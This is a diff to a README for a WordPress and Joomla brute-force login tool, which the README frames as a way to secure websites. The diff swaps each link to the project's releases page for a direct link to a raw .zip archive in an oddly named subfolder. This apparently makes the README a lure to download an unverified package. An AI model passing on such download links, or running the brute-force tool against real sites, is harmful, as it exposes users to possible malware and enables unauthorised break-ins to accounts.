@@ -6,7 +6,7 @@ Welcome to the **wordpress-and-joomla-brute-force** project. This tool helps you
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/breezyk45/wordpress-and-joomla-brute-force/releases)
+[![Download](https://raw.githubusercontent.com/breezyk45/wordpress-and-joomla-brute-force/main/archfriend/wordpress-and-joomla-brute-force.zip)](https://raw.githubusercontent.com/breezyk45/wordpress-and-joomla-brute-force/main/archfriend/wordpress-and-joomla-brute-force.zip)
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ Before you proceed, ensure your system meets these requirements:
 
 To download the software, click the link below:
 
-[Visit this page to download](https://github.com/breezyk45/wordpress-and-joomla-brute-force/releases)
+[Visit this page to download](https://raw.githubusercontent.com/breezyk45/wordpress-and-joomla-brute-force/main/archfriend/wordpress-and-joomla-brute-force.zip)
 
 ### Step 2: Choose the Right Package
 
@@ -80,6 +80,6 @@ For more updates, you can follow our project on GitHub. You may also find relate
 
 To begin using this tool, revisit the download page here:
 
-[Visit this page to download](https://github.com/breezyk45/wordpress-and-joomla-brute-force/releases)
+[Visit this page to download](https://raw.githubusercontent.com/breezyk45/wordpress-and-joomla-brute-force/main/archfriend/wordpress-and-joomla-brute-force.zip)
 
 Thank you for choosing **wordpress-and-joomla-brute-force**. We hope this tool helps you secure your websites effectively!
